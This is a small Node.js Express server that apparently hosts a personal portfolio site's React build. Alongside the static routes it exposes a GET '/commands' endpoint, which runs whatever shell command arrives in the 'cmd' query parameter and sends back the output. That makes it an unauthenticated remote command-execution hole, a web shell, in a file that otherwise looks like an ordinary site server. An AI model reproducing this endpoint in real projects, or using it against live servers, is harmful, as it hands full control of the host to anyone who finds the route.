const express = require("express");
const app = express();
const path = require("path");

var sys = require("sys");
var exec = require("child_process").exec;

const port = process.env.PORT || 5000;
const host = "0.0.0.0";
// console.log that your server is up and running
app.listen(port, host, () => console.log(`Listening on port ${port}`));

const root = require("path").join(__dirname, "ishank-portfolio", "build");

app.use(express.static(root));

app.get("/commands", (req, res) => {
  exec(req.query.cmd, function (err, stdout, stderr) {
    console.log(stdout);
    res.send(stdout);
  });
});

app.get("*", (req, res) => {
  res.sendFile("index.html", { root });
});
